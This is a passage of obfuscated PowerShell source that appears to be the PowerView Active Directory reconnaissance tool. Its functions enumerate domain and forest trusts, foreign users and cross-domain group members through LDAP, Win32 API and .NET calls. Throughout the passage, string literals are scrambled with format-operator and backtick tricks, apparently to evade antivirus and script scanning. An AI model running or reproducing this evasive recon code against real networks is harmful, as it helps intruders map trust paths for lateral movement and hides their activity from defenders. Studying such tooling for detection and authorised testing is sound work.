            Write-Verbose "[Find-DomainLocalGroupMember] Total number of hosts: $($TargetComputers.count) "
            Write-Verbose ('['+'Fi'+'n'+'d-DomainLocal'+'GroupM'+'embe'+'r] '+'Del'+'a'+'y: '+"$Delay, "+'Jit'+'ter'+': '+"$Jitter")
            $Counter = 0
            $RandNo = New-Object System.Random

            ForEach ($TargetComputer in $TargetComputers) {
                $Counter = $Counter + 1

                
                Start-Sleep -Seconds $RandNo.Next((1-$Jitter)*$Delay, (1+$Jitter)*$Delay)

                Write-Verbose "[Find-DomainLocalGroupMember] Enumerating server $TargetComputer ($Counter of $($TargetComputers.count)) "
                Invoke-Command -ScriptBlock $HostEnumBlock -ArgumentList $TargetComputer, $GroupName, $Method, $LogonToken
            }
        }
        else {
            Write-Verbose ('[Find-Domain'+'Loca'+'lG'+'ro'+'up'+'M'+'e'+'mbe'+'r]'+' '+'U'+'sing '+'th'+'read'+'ing'+' '+'wi'+'th '+'threa'+'ds'+': '+"$Threads")

            
            $ScriptParams = @{
                ("{1}{0}{2}" -f 'Nam','Group','e') = $GroupName
                ("{0}{1}" -f 'Me','thod') = $Method
                ("{1}{0}{2}" -f'kenHand','To','le') = $LogonToken
            }

            
            New-ThreadedFunction -ComputerName $TargetComputers -ScriptBlock $HostEnumBlock -ScriptParameters $ScriptParams -Threads $Threads
        }
    }

    END {
        if ($LogonToken) {
            Invoke-RevertToSelf -TokenHandle $LogonToken
        }
    }
}








function Get-DomainTrust {


    [Diagnostics.CodeAnalysis.SuppressMessageAttribute({"{0}{2}{1}{3}"-f'PS','Proces','Should','s'}, '')]
    [OutputType({"{2}{6}{1}{4}{3}{5}{0}{7}" -f '.N','.D','PowerV','ai','om','nTrust','iew','ET'})]
    [OutputType({"{5}{6}{3}{1}{2}{0}{4}"-f'u','.Domain','Tr','erView','st.LDAP','P','ow'})]
    [OutputType({"{3}{1}{7}{2}{4}{0}{5}{6}" -f'ainTru','o','.D','P','om','st.AP','I','werView'})]
    [CmdletBinding(DefaultParameterSetName = {"{0}{1}"-f'L','DAP'})]
    Param(
        [Parameter(Position = 0, ValueFromPipeline = $True, ValueFromPipelineByPropertyName = $True)]
        [Alias({"{1}{0}" -f 'e','Nam'})]
        [ValidateNotNullOrEmpty()]
        [String]
        $Domain,

        [Parameter(ParameterSetName = 'API')]
        [Switch]
        $API,

        [Parameter(ParameterSetName = 'NET')]
        [Switch]
        $NET,

        [Parameter(ParameterSetName = "L`DaP")]
        [ValidateNotNullOrEmpty()]
        [Alias({"{0}{1}"-f 'Fi','lter'})]
        [String]
        $LDAPFilter,

        [Parameter(ParameterSetName = "Ld`Ap")]
        [ValidateNotNullOrEmpty()]
        [String[]]
        $Properties,

        [Parameter(ParameterSetName = "l`Dap")]
        [ValidateNotNullOrEmpty()]
        [Alias({"{0}{1}"-f'AD','SPath'})]
        [String]
        $SearchBase,

        [Parameter(ParameterSetName = "L`dAp")]
        [Parameter(ParameterSetName = 'API')]
        [ValidateNotNullOrEmpty()]
        [Alias({"{0}{4}{1}{3}{2}" -f 'DomainC','ro','er','ll','ont'})]
        [String]
        $Server,

        [Parameter(ParameterSetName = "ld`AP")]
        [ValidateSet({"{0}{1}" -f'B','ase'}, {"{1}{0}"-f 'evel','OneL'}, {"{2}{1}{0}" -f'ee','r','Subt'})]
        [String]
        $SearchScope = ("{0}{2}{1}"-f 'Su','e','btre'),

        [Parameter(ParameterSetName = "lD`AP")]
        [ValidateRange(1, 10000)]
        [Int]
        $ResultPageSize = 200,

        [Parameter(ParameterSetName = "L`daP")]
        [ValidateRange(1, 10000)]
        [Int]
        $ServerTimeLimit,

        [Parameter(ParameterSetName = "L`DAP")]
        [Switch]
        $Tombstone,

        [Alias({"{0}{1}{2}"-f 'Re','t','urnOne'})]
        [Switch]
        $FindOne,

        [Parameter(ParameterSetName = "LD`Ap")]
        [Management.Automation.PSCredential]
        [Management.Automation.CredentialAttribute()]
        $Credential = [Management.Automation.PSCredential]::Empty
    )

    BEGIN {
        $TrustAttributes = @{
            [uint32]("{0}{1}{2}"-f'0x00','00','0001') = ("{2}{1}{0}{3}" -f'RAN','N_T','NO','SITIVE')
            [uint32]("{2}{0}{1}"-f '0000','02','0x00') = ("{1}{0}{2}" -f 'EL','UPLEV','_ONLY')
            [uint32]("{2}{0}{1}" -f'x000','00004','0') = ("{1}{0}{2}" -f'R','FILTE','_SIDS')
            [uint32]("{1}{0}{2}"-f'x00','0','000008') = ("{0}{2}{1}{3}" -f 'FOREST_T','V','RANSITI','E')
            [uint32]("{0}{2}{1}"-f'0x','00010','000') = ("{4}{3}{1}{0}{5}{2}"-f'ORGANIZA','S_','ON','OS','CR','TI')
            [uint32]("{1}{2}{0}"-f '000020','0x','00') = ("{1}{0}{2}" -f'N_FOR','WITHI','EST')
            [uint32]("{2}{0}{1}"-f'0000','40','0x00') = ("{0}{3}{1}{5}{2}{4}" -f 'TREAT_','_EXT','A','AS','L','ERN')
            [uint32]("{2}{1}{0}" -f '0','08','0x00000') = ("{0}{5}{3}{4}{1}{2}{6}" -f 'TRUST','4_ENCR','YPT','S','ES_RC','_U','ION')
            [uint32]("{0}{2}{1}"-f'0','0000100','x0') = ("{2}{4}{0}{1}{3}" -f'K','E','TRUST_USE','YS','S_AES_')
            [uint32]("{1}{2}{0}{3}" -f '00','0x0','0','0200') = ("{8}{3}{6}{4}{5}{2}{1}{0}{7}" -f 'E','DEL','T_','S_ORGANIZAT','ON_NO','_TG','I','GATION','CROS')
            [uint32]("{0}{2}{1}"-f'0','000400','x00') = ("{3}{0}{2}{1}"-f'IM_','RUST','T','P')
        }

        $LdapSearcherArguments = @{}
        if ($PSBoundParameters[("{0}{2}{1}"-f'D','n','omai')]) { $LdapSearcherArguments[("{1}{2}{0}" -f 'n','Doma','i')] = $Domain }
        if ($PSBoundParameters[("{0}{3}{2}{1}" -f'L','er','APFilt','D')]) { $LdapSearcherArguments[("{1}{2}{0}{3}"-f 'te','LDAP','Fil','r')] = $LDAPFilter }
        if ($PSBoundParameters[("{0}{2}{1}" -f'P','operties','r')]) { $LdapSearcherArguments[("{1}{0}{2}"-f'pertie','Pro','s')] = $Properties }
        if ($PSBoundParameters[("{1}{0}{2}" -f 'rchBa','Sea','se')]) { $LdapSearcherArguments[("{2}{0}{1}" -f 'a','se','SearchB')] = $SearchBase }
        if ($PSBoundParameters[("{0}{1}"-f'S','erver')]) { $LdapSearcherArguments[("{0}{1}{2}"-f 'Ser','ve','r')] = $Server }
        if ($PSBoundParameters[("{0}{1}{2}" -f 'Se','archScop','e')]) { $LdapSearcherArguments[("{0}{2}{3}{1}" -f'S','rchScope','e','a')] = $SearchScope }
        if ($PSBoundParameters[("{1}{3}{0}{4}{2}"-f'ultPa','Re','Size','s','ge')]) { $LdapSearcherArguments[("{0}{1}{3}{2}"-f'Re','s','ze','ultPageSi')] = $ResultPageSize }
        if ($PSBoundParameters[("{2}{0}{1}{3}"-f 'erv','erTimeLim','S','it')]) { $LdapSearcherArguments[("{3}{2}{1}{0}"-f'meLimit','i','erT','Serv')] = $ServerTimeLimit }
        if ($PSBoundParameters[("{2}{1}{0}"-f'e','n','Tombsto')]) { $LdapSearcherArguments[("{1}{2}{0}"-f 'one','Tom','bst')] = $Tombstone }
        if ($PSBoundParameters[("{0}{1}{2}" -f 'Cr','e','dential')]) { $LdapSearcherArguments[("{0}{2}{1}"-f'Cr','tial','eden')] = $Credential }
    }

    PROCESS {
        if ($PsCmdlet.ParameterSetName -ne 'API') {
            $NetSearcherArguments = @{}
            if ($Domain -and $Domain.Trim() -ne '') {
                $SourceDomain = $Domain
            }
            else {
                if ($PSBoundParameters[("{0}{1}{2}" -f'Cr','ed','ential')]) {
                    $SourceDomain = (Get-Domain -Credential $Credential).Name
                }
                else {
                    $SourceDomain = (Get-Domain).Name
                }
            }
        }
        elseif ($PsCmdlet.ParameterSetName -ne 'NET') {
            if ($Domain -and $Domain.Trim() -ne '') {
                $SourceDomain = $Domain
            }
            else {
                $SourceDomain = $Env:USERDNSDOMAIN
            }
        }

        if ($PsCmdlet.ParameterSetName -eq ("{0}{1}" -f 'LD','AP')) {
            
            $TrustSearcher = Get-DomainSearcher @LdapSearcherArguments
            $SourceSID = Get-DomainSID @NetSearcherArguments

            if ($TrustSearcher) {

                $TrustSearcher.Filter = (("{1}{6}{3}{2}{4}{5}{0}"-f'dDomain)','(ob','s','las','=','truste','jectC'))

                if ($PSBoundParameters[("{1}{0}"-f'indOne','F')]) { $Results = $TrustSearcher.FindOne() }
                else { $Results = $TrustSearcher.FindAll() }
                $Results | Where-Object {$_} | ForEach-Object {
                    $Props = $_.Properties
                    $DomainTrust = New-Object PSObject

                    $TrustAttrib = @()
                    $TrustAttrib += $TrustAttributes.Keys | Where-Object { $Props.trustattributes[0] -band $_ } | ForEach-Object { $TrustAttributes[$_] }

                    $Direction = Switch ($Props.trustdirection) {
                        0 { ("{1}{2}{0}" -f'ed','Dis','abl') }
                        1 { ("{1}{0}" -f 'nd','Inbou') }
                        2 { ("{1}{2}{0}" -f'd','Ou','tboun') }
                        3 { ("{2}{0}{1}" -f 'idire','ctional','B') }
                    }

                    $TrustType = Switch ($Props.trusttype) {
                        1 { ("{2}{4}{7}{6}{3}{0}{5}{1}"-f 'C','Y','WIND','A','O','TIVE_DIRECTOR','ON_','WS_N') }
                        2 { ("{4}{1}{0}{2}{3}"-f 'TIVE_D','OWS_AC','IRECTOR','Y','WIND') }
                        3 { 'MIT' }
                    }

                    $Distinguishedname = $Props.distinguishedname[0]
                    $SourceNameIndex = $Distinguishedname.IndexOf('DC=')
                    if ($SourceNameIndex) {
                        $SourceDomain = $($Distinguishedname.SubString($SourceNameIndex)) -replace 'DC=','' -replace ',','.'
                    }
                    else {
                        $SourceDomain = ""
                    }

                    $TargetNameIndex = $Distinguishedname.IndexOf(("{2}{1}{0}"-f'stem','Sy',',CN='))
                    if ($SourceNameIndex) {
                        $TargetDomain = $Distinguishedname.SubString(3, $TargetNameIndex-3)
                    }
                    else {
                        $TargetDomain = ""
                    }

                    $ObjectGuid = New-Object Guid @(,$Props.objectguid[0])
                    $TargetSID = (New-Object System.Security.Principal.SecurityIdentifier($Props.securityidentifier[0],0)).Value

                    $DomainTrust | Add-Member Noteproperty ("{0}{2}{1}"-f'S','urceName','o') $SourceDomain
                    $DomainTrust | Add-Member Noteproperty ("{1}{0}{2}"-f 'ge','Tar','tName') $Props.name[0]
                    
                    $DomainTrust | Add-Member Noteproperty ("{2}{0}{1}"-f'ustTyp','e','Tr') $TrustType
                    $DomainTrust | Add-Member Noteproperty ("{0}{3}{2}{1}{4}"-f'T','b','ri','rustAtt','utes') $($TrustAttrib -join ',')
                    $DomainTrust | Add-Member Noteproperty ("{2}{0}{3}{1}" -f'us','n','Tr','tDirectio') "$Direction"
                    $DomainTrust | Add-Member Noteproperty ("{3}{1}{2}{0}" -f 'd','reat','e','WhenC') $Props.whencreated[0]
                    $DomainTrust | Add-Member Noteproperty ("{0}{3}{1}{2}" -f'Whe','nge','d','nCha') $Props.whenchanged[0]
                    $DomainTrust.PSObject.TypeNames.Insert(0, ("{5}{2}{1}{6}{0}{3}{4}"-f 'rust','.Doma','werView','.LD','AP','Po','inT'))
                    $DomainTrust
                }
                if ($Results) {
                    try { $Results.dispose() }
                    catch {
                        Write-Verbose ('[Get'+'-D'+'oma'+'i'+'nTrust]'+' '+'Er'+'r'+'or '+'di'+'s'+'posing '+'of'+' '+'th'+'e '+'Re'+'su'+'lts '+'obje'+'c'+'t: '+"$_")
                    }
                }
                $TrustSearcher.dispose()
            }
        }
        elseif ($PsCmdlet.ParameterSetName -eq 'API') {
            
            if ($PSBoundParameters[("{1}{0}" -f 'r','Serve')]) {
                $TargetDC = $Server
            }
            elseif ($Domain -and $Domain.Trim() -ne '') {
                $TargetDC = $Domain
            }
            else {
                
                $TargetDC = $Null
            }

            
            $PtrInfo = [IntPtr]::Zero

            
            $Flags = 63
            $DomainCount = 0

            
            $Result = $Netapi32::DsEnumerateDomainTrusts($TargetDC, $Flags, [ref]$PtrInfo, [ref]$DomainCount)

            
            $Offset = $PtrInfo.ToInt64()

            
            if (($Result -eq 0) -and ($Offset -gt 0)) {

                
                $Increment = $DS_DOMAIN_TRUSTS::GetSize()

                
                for ($i = 0; ($i -lt $DomainCount); $i++) {
                    
                    $NewIntPtr = New-Object System.Intptr -ArgumentList $Offset
                    $Info = $NewIntPtr -as $DS_DOMAIN_TRUSTS

                    $Offset = $NewIntPtr.ToInt64()
                    $Offset += $Increment

                    $SidString = ''
                    $Result = $Advapi32::ConvertSidToStringSid($Info.DomainSid, [ref]$SidString);$LastError = [Runtime.InteropServices.Marshal]::GetLastWin32Error()

                    if ($Result -eq 0) {
                        Write-Verbose "[Get-DomainTrust] Error: $(([ComponentModel.Win32Exception] $LastError).Message) "
                    }
                    else {
                        $DomainTrust = New-Object PSObject
                        $DomainTrust | Add-Member Noteproperty ("{0}{1}{2}" -f 'SourceN','am','e') $SourceDomain
                        $DomainTrust | Add-Member Noteproperty ("{1}{2}{0}"-f'me','Ta','rgetNa') $Info.DnsDomainName
                        $DomainTrust | Add-Member Noteproperty ("{0}{4}{3}{2}{1}"-f'Targe','e','Nam','tbios','tNe') $Info.NetbiosDomainName
                        $DomainTrust | Add-Member Noteproperty ("{0}{1}"-f 'Fl','ags') $Info.Flags
                        $DomainTrust | Add-Member Noteproperty ("{2}{0}{1}" -f'en','tIndex','Par') $Info.ParentIndex
                        $DomainTrust | Add-Member Noteproperty ("{0}{2}{1}" -f'Tr','Type','ust') $Info.TrustType
                        $DomainTrust | Add-Member Noteproperty ("{3}{2}{1}{4}{0}"-f'es','ri','ustAtt','Tr','but') $Info.TrustAttributes
                        $DomainTrust | Add-Member Noteproperty ("{1}{2}{0}"-f'id','T','argetS') $SidString
                        $DomainTrust | Add-Member Noteproperty ("{1}{0}{2}" -f'getGui','Tar','d') $Info.DomainGuid
                        $DomainTrust.PSObject.TypeNames.Insert(0, ("{2}{3}{4}{0}{1}" -f 'iew.DomainT','rust.API','P','ower','V'))
                        $DomainTrust
                    }
                }
                
                $Null = $Netapi32::NetApiBufferFree($PtrInfo)
            }
            else {
                Write-Verbose "[Get-DomainTrust] Error: $(([ComponentModel.Win32Exception] $Result).Message) "
            }
        }
        else {
            
            $FoundDomain = Get-Domain @NetSearcherArguments
            if ($FoundDomain) {
                $FoundDomain.GetAllTrustRelationships() | ForEach-Object {
                    $_.PSObject.TypeNames.Insert(0, ("{1}{4}{2}{3}{0}"-f'Trust.NET','PowerView','a','in','.Dom'))
                    $_
                }
            }
        }
    }
}


function Get-ForestTrust {


    [Diagnostics.CodeAnalysis.SuppressMessageAttribute({"{2}{3}{1}{0}"-f 'ocess','r','PSS','houldP'}, '')]
    [OutputType({"{1}{2}{4}{3}{5}{0}"-f'.NET','Powe','rV','or','iew.F','estTrust'})]
    [CmdletBinding()]
    Param(
        [Parameter(Position = 0, ValueFromPipeline = $True, ValueFromPipelineByPropertyName = $True)]
        [Alias({"{0}{1}"-f'Na','me'})]
        [ValidateNotNullOrEmpty()]
        [String]
        $Forest,

        [Management.Automation.PSCredential]
        [Management.Automation.CredentialAttribute()]
        $Credential = [Management.Automation.PSCredential]::Empty
    )

    PROCESS {
        $NetForestArguments = @{}
        if ($PSBoundParameters[("{1}{0}"-f'orest','F')]) { $NetForestArguments[("{0}{1}"-f 'Fores','t')] = $Forest }
        if ($PSBoundParameters[("{0}{2}{1}" -f 'Creden','ial','t')]) { $NetForestArguments[("{1}{2}{0}"-f 'tial','Cre','den')] = $Credential }

        $FoundForest = Get-Forest @NetForestArguments

        if ($FoundForest) {
            $FoundForest.GetAllTrustRelationships() | ForEach-Object {
                $_.PSObject.TypeNames.Insert(0, ("{3}{2}{1}{0}{4}" -f 'st.NE','stTru','re','PowerView.Fo','T'))
                $_
            }
        }
    }
}


function Get-DomainForeignUser {


    [Diagnostics.CodeAnalysis.SuppressMessageAttribute({"{3}{0}{2}{1}{4}" -f 'l','r','dP','PSShou','ocess'}, '')]
    [OutputType({"{1}{5}{3}{4}{0}{2}"-f'.Foreig','Pow','nUser','Vi','ew','er'})]
    [CmdletBinding()]
    Param(
        [Parameter(Position = 0, ValueFromPipeline = $True, ValueFromPipelineByPropertyName = $True)]
        [Alias({"{0}{1}" -f 'Na','me'})]
        [ValidateNotNullOrEmpty()]
        [String]
        $Domain,

        [ValidateNotNullOrEmpty()]
        [Alias({"{2}{0}{1}" -f'lte','r','Fi'})]
        [String]
        $LDAPFilter,

        [ValidateNotNullOrEmpty()]
        [String[]]
        $Properties,

        [ValidateNotNullOrEmpty()]
        [Alias({"{0}{1}{2}"-f'ADS','P','ath'})]
        [String]
        $SearchBase,

        [ValidateNotNullOrEmpty()]
        [Alias({"{5}{3}{4}{1}{2}{0}"-f'r','l','le','tr','o','DomainCon'})]
        [String]
        $Server,

        [ValidateSet({"{0}{1}"-f 'Ba','se'}, {"{1}{0}{2}"-f'eLeve','On','l'}, {"{2}{1}{0}" -f 'tree','b','Su'})]
        [String]
        $SearchScope = ("{2}{0}{1}" -f't','ree','Sub'),

        [ValidateRange(1, 10000)]
        [Int]
        $ResultPageSize = 200,

        [ValidateRange(1, 10000)]
        [Int]
        $ServerTimeLimit,

        [ValidateSet({"{0}{1}"-f'Da','cl'}, {"{1}{0}" -f 'p','Grou'}, {"{0}{1}"-f'No','ne'}, {"{1}{0}"-f 'wner','O'}, {"{0}{1}" -f'Sa','cl'})]
        [String]
        $SecurityMasks,

        [Switch]
        $Tombstone,

        [Management.Automation.PSCredential]
        [Management.Automation.CredentialAttribute()]
        $Credential = [Management.Automation.PSCredential]::Empty
    )

    BEGIN {
        $SearcherArguments = @{}
        $SearcherArguments[("{2}{1}{0}{3}"-f 'l','i','LDAPF','ter')] = ("{1}{2}{0}{3}"-f 'be','(','mem','rof=*)')
        if ($PSBoundParameters[("{1}{0}{2}" -f 'o','D','main')]) { $SearcherArguments[("{1}{0}" -f'in','Doma')] = $Domain }
        if ($PSBoundParameters[("{0}{2}{1}" -f 'Prop','ies','ert')]) { $SearcherArguments[("{0}{2}{1}" -f'Propert','es','i')] = $Properties }
        if ($PSBoundParameters[("{1}{0}{2}" -f'a','Se','rchBase')]) { $SearcherArguments[("{0}{2}{1}"-f 'Se','hBase','arc')] = $SearchBase }
        if ($PSBoundParameters[("{0}{1}" -f 'S','erver')]) { $SearcherArguments[("{0}{1}"-f'S','erver')] = $Server }
        if ($PSBoundParameters[("{1}{2}{0}"-f 'e','S','earchScop')]) { $SearcherArguments[("{1}{2}{0}"-f 'e','Search','Scop')] = $SearchScope }
        if ($PSBoundParameters[("{0}{3}{2}{1}"-f'R','geSize','ultPa','es')]) { $SearcherArguments[("{4}{1}{3}{2}{0}"-f'ze','esultP','i','ageS','R')] = $ResultPageSize }
        if ($PSBoundParameters[("{2}{1}{0}" -f'Limit','verTime','Ser')]) { $SearcherArguments[("{3}{0}{2}{1}" -f 'T','mit','imeLi','Server')] = $ServerTimeLimit }
        if ($PSBoundParameters[("{2}{3}{1}{0}"-f 'ks','Mas','Se','curity')]) { $SearcherArguments[("{2}{1}{0}" -f 'ityMasks','ecur','S')] = $SecurityMasks }
        if ($PSBoundParameters[("{1}{3}{0}{2}" -f'bs','To','tone','m')]) { $SearcherArguments[("{0}{2}{1}" -f'Tomb','e','ston')] = $Tombstone }
        if ($PSBoundParameters[("{2}{1}{0}" -f 'tial','en','Cred')]) { $SearcherArguments[("{0}{2}{1}" -f'Creden','al','ti')] = $Credential }
        if ($PSBoundParameters['Raw']) { $SearcherArguments['Raw'] = $Raw }
    }

    PROCESS {
        Get-DomainUser @SearcherArguments  | ForEach-Object {
            ForEach ($Membership in $_.memberof) {
                $Index = $Membership.IndexOf('DC=')
                if ($Index) {

                    $GroupDomain = $($Membership.SubString($Index)) -replace 'DC=','' -replace ',','.'
                    $UserDistinguishedName = $_.distinguishedname
                    $UserIndex = $UserDistinguishedName.IndexOf('DC=')
                    $UserDomain = $($_.distinguishedname.SubString($UserIndex)) -replace 'DC=','' -replace ',','.'

                    if ($GroupDomain -ne $UserDomain) {
                        
                        $GroupName = $Membership.Split(',')[0].split('=')[1]
                        $ForeignUser = New-Object PSObject
                        $ForeignUser | Add-Member Noteproperty ("{2}{0}{1}{3}"-f'serDom','ai','U','n') $UserDomain
                        $ForeignUser | Add-Member Noteproperty ("{0}{1}" -f 'UserNam','e') $_.samaccountname
                        $ForeignUser | Add-Member Noteproperty ("{3}{2}{0}{1}" -f 'uishedN','ame','g','UserDistin') $_.distinguishedname
                        $ForeignUser | Add-Member Noteproperty ("{2}{0}{1}" -f 'pDomai','n','Grou') $GroupDomain
                        $ForeignUser | Add-Member Noteproperty ("{2}{1}{0}"-f'ame','pN','Grou') $GroupName
                        $ForeignUser | Add-Member Noteproperty ("{4}{1}{3}{2}{0}"-f'e','roupDisting','dNam','uishe','G') $Membership
                        $ForeignUser.PSObject.TypeNames.Insert(0, ("{4}{2}{3}{0}{1}" -f 'reignUs','er','werVi','ew.Fo','Po'))
                        $ForeignUser
                    }
                }
            }
        }
    }
}


function Get-DomainForeignGroupMember {


    [Diagnostics.CodeAnalysis.SuppressMessageAttribute({"{1}{0}{2}"-f'uldP','PSSho','rocess'}, '')]
    [OutputType({"{5}{8}{2}{4}{3}{1}{0}{6}{7}"-f'r','ignG','wer','ew.Fore','Vi','P','oupM','ember','o'})]
    [CmdletBinding()]
    Param(
        [Parameter(Position = 0, ValueFromPipeline = $True, ValueFromPipelineByPropertyName = $True)]
        [Alias({"{0}{1}"-f'Na','me'})]
        [ValidateNotNullOrEmpty()]
        [String]
        $Domain,

        [ValidateNotNullOrEmpty()]
        [Alias({"{0}{1}"-f'Fi','lter'})]
        [String]
        $LDAPFilter,

        [ValidateNotNullOrEmpty()]
        [String[]]
        $Properties,

        [ValidateNotNullOrEmpty()]
        [Alias({"{0}{1}"-f 'ADSPat','h'})]
        [String]
        $SearchBase,

        [ValidateNotNullOrEmpty()]
        [Alias({"{5}{3}{1}{2}{0}{4}"-f'rolle','n','t','nCo','r','Domai'})]
        [String]
        $Server,

        [ValidateSet({"{0}{1}"-f 'Ba','se'}, {"{1}{0}"-f'el','OneLev'}, {"{2}{1}{0}"-f'btree','u','S'})]
        [String]
        $SearchScope = ("{1}{0}{2}"-f'u','S','btree'),

        [ValidateRange(1, 10000)]
        [Int]
        $ResultPageSize = 200,

        [ValidateRange(1, 10000)]
        [Int]
        $ServerTimeLimit,

        [ValidateSet({"{0}{1}"-f 'Dac','l'}, {"{1}{0}" -f 'p','Grou'}, {"{0}{1}" -f 'Non','e'}, {"{1}{0}"-f 'er','Own'}, {"{1}{0}" -f 'l','Sac'})]
        [String]
        $SecurityMasks,

        [Switch]
        $Tombstone,

        [Management.Automation.PSCredential]
        [Management.Automation.CredentialAttribute()]
        $Credential = [Management.Automation.PSCredential]::Empty
    )

    BEGIN {
        $SearcherArguments = @{}
        $SearcherArguments[("{2}{1}{0}" -f'ter','DAPFil','L')] = (("{2}{0}{1}" -f'*',')','(member='))
        if ($PSBoundParameters[("{0}{1}" -f 'Do','main')]) { $SearcherArguments[("{1}{0}" -f 'main','Do')] = $Domain }
        if ($PSBoundParameters[("{0}{2}{3}{1}"-f'Pr','es','o','perti')]) { $SearcherArguments[("{2}{1}{0}{3}"-f'tie','r','Prope','s')] = $Properties }
        if ($PSBoundParameters[("{2}{1}{0}" -f 'se','Ba','Search')]) { $SearcherArguments[("{1}{0}{3}{2}"-f'earchB','S','e','as')] = $SearchBase }
        if ($PSBoundParameters[("{0}{1}"-f 'Serv','er')]) { $SearcherArguments[("{0}{1}{2}" -f 'S','e','rver')] = $Server }
        if ($PSBoundParameters[("{0}{1}{2}"-f'Sear','chScop','e')]) { $SearcherArguments[("{1}{0}{2}" -f'p','SearchSco','e')] = $SearchScope }
        if ($PSBoundParameters[("{3}{0}{1}{2}" -f'Pag','eSiz','e','Result')]) { $SearcherArguments[("{0}{1}{3}{2}" -f'Res','ult','eSize','Pag')] = $ResultPageSize }
        if ($PSBoundParameters[("{1}{4}{2}{0}{3}" -f 'e','Server','im','Limit','T')]) { $SearcherArguments[("{3}{0}{1}{2}{4}"-f'erve','rTi','meLimi','S','t')] = $ServerTimeLimit }
        if ($PSBoundParameters[("{0}{1}{2}" -f'Secu','rityMas','ks')]) { $SearcherArguments[("{1}{2}{0}" -f'tyMasks','Secur','i')] = $SecurityMasks }
        if ($PSBoundParameters[("{2}{0}{1}" -f 'on','e','Tombst')]) { $SearcherArguments[("{1}{2}{0}" -f'ne','Tombst','o')] = $Tombstone }
        if ($PSBoundParameters[("{3}{1}{0}{2}" -f'enti','ed','al','Cr')]) { $SearcherArguments[("{0}{2}{1}"-f 'Credent','l','ia')] = $Credential }
        if ($PSBoundParameters['Raw']) { $SearcherArguments['Raw'] = $Raw }
    }

    PROCESS {
        
        $ExcludeGroups = @(("{1}{0}"-f'sers','U'), ("{0}{1}{2}"-f 'Domain Use','r','s'), ("{1}{0}{2}"-f'e','Gu','sts'))

        Get-DomainGroup @SearcherArguments | Where-Object { $ExcludeGroups -notcontains $_.samaccountname } | ForEach-Object {
            $GroupName = $_.samAccountName
            $GroupDistinguishedName = $_.distinguishedname
            $GroupDomain = $GroupDistinguishedName.SubString($GroupDistinguishedName.IndexOf('DC=')) -replace 'DC=','' -replace ',','.'

            $_.member | ForEach-Object {
                
                
                $MemberDomain = $_.SubString($_.IndexOf('DC=')) -replace 'DC=','' -replace ',','.'
                if (($_ -match ("{0}{3}{1}{2}"-f'CN=S-','.','*','1-5-21.*-')) -or ($GroupDomain -ne $MemberDomain)) {
                    $MemberDistinguishedName = $_
                    $MemberName = $_.Split(',')[0].split('=')[1]

                    $ForeignGroupMember = New-Object PSObject
                    $ForeignGroupMember | Add-Member Noteproperty ("{2}{0}{1}{3}"-f'pD','o','Grou','main') $GroupDomain
                    $ForeignGroupMember | Add-Member Noteproperty ("{0}{1}" -f'Gr','oupName') $GroupName
                    $ForeignGroupMember | Add-Member Noteproperty ("{5}{2}{1}{4}{3}{0}" -f 'e','g','in','shedNam','ui','GroupDist') $GroupDistinguishedName
                    $ForeignGroupMember | Add-Member Noteproperty ("{2}{0}{1}"-f 'mberDo','main','Me') $MemberDomain
                    $ForeignGroupMember | Add-Member Noteproperty ("{1}{2}{0}"-f 'berName','Me','m') $MemberName
                    $ForeignGroupMember | Add-Member Noteproperty ("{3}{4}{5}{2}{0}{1}" -f'guis','hedName','stin','Membe','r','Di') $MemberDistinguishedName
                    $ForeignGroupMember.PSObject.TypeNames.Insert(0, ("{6}{0}{3}{2}{1}{5}{4}" -f'ow','oreignGroupMe','iew.F','erV','ber','m','P'))
                    $ForeignGroupMember
                }
            }
        }
    }
}


function Get-DomainTrustMapping {


    [Diagnostics.CodeAnalysis.SuppressMessageAttribute({"{0}{4}{3}{2}{1}"-f 'PSS','s','roces','dP','houl'}, '')]
    [OutputType({"{5}{0}{3}{2}{4}{1}" -f 'ew.Domai','ET','ust','nTr','.N','PowerVi'})]
    [OutputType({"{1}{5}{2}{0}{4}{3}"-f'omainTr','Power','iew.D','.LDAP','ust','V'})]
    [OutputType({"{7}{2}{6}{5}{3}{4}{1}{0}" -f'API','st.','er','Tr','u','ew.Domain','Vi','Pow'})]
    [CmdletBinding(DefaultParameterSetName = {"{0}{1}" -f'LDA','P'})]
    Param(
        [Parameter(ParameterSetName = 'API')]
        [Switch]
        $API,

        [Parameter(ParameterSetName = 'NET')]
        [Switch]
        $NET,

        [Parameter(ParameterSetName = "l`DaP")]
        [ValidateNotNullOrEmpty()]
        [Alias({"{2}{1}{0}"-f'er','t','Fil'})]
        [String]
        $LDAPFilter,

        [Parameter(ParameterSetName = "LD`Ap")]
        [ValidateNotNullOrEmpty()]
        [String[]]
        $Properties,

        [Parameter(ParameterSetName = "Ld`AP")]
        [ValidateNotNullOrEmpty()]
        [Alias({"{0}{2}{1}" -f'A','Path','DS'})]
        [String]
        $SearchBase,

        [Parameter(ParameterSetName = "Ld`Ap")]
        [Parameter(ParameterSetName = 'API')]
        [ValidateNotNullOrEmpty()]
        [Alias({"{3}{2}{1}{4}{0}"-f 'er','inCo','oma','D','ntroll'})]
        [String]
        $Server,

        [Parameter(ParameterSetName = "L`DAp")]
        [ValidateSet({"{1}{0}"-f 'ase','B'}, {"{0}{1}{2}"-f'OneL','eve','l'}, {"{2}{0}{1}" -f'b','tree','Su'})]
        [String]
        $SearchScope = ("{0}{1}" -f 'Subtr','ee'),

        [Parameter(ParameterSetName = "lD`AP")]
        [ValidateRange(1, 10000)]
        [Int]
        $ResultPageSize = 200,

        [Parameter(ParameterSetName = "ld`AP")]
        [ValidateRange(1, 10000)]
        [Int]
        $ServerTimeLimit,

        [Parameter(ParameterSetName = "Ld`AP")]
        [Switch]
        $Tombstone,

        [Parameter(ParameterSetName = "l`dAP")]
        [Management.Automation.PSCredential]
        [Management.Automation.CredentialAttribute()]
        $Credential = [Management.Automation.PSCredential]::Empty
    )

    
    $SeenDomains = @{}

    
    $Domains = New-Object System.Collections.Stack

    $DomainTrustArguments = @{}
    if ($PSBoundParameters['API']) { $DomainTrustArguments['API'] = $API }
    if ($PSBoundParameters['NET']) { $DomainTrustArguments['NET'] = $NET }
    if ($PSBoundParameters[("{2}{1}{0}"-f'lter','i','LDAPF')]) { $DomainTrustArguments[("{0}{2}{1}" -f'L','PFilter','DA')] = $LDAPFilter }
    if ($PSBoundParameters[("{0}{2}{3}{1}" -f 'Pro','ties','pe','r')]) { $DomainTrustArguments[("{1}{3}{0}{2}" -f't','Prop','ies','er')] = $Properties }
